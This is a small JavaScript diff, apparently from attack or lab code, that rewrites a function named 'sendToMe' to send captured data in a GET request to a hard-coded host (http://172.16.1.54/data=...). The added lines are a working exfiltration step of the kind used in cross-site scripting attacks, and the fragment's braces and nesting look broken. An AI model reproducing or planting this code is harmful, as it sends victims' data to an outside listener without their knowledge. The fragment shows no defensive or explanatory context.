@@ -22,7 +22,13 @@
 				}
 				xhr.send(prm);
 			function sendToMe(data){
-				xhr.open("GET", "http://172.16.1.54:80", true);
+				var xhttp = new XMLHttpRequest();
+					xhttp.onreadystatechange = function() {
+					    if (this.readyState == 4 && this.status == 200) {
+					    }
+					};
+					xhttp.open("GET", "http://172.16.1.54/data=" + data, true);
+					xhttp.send();
 			}
 
 			}
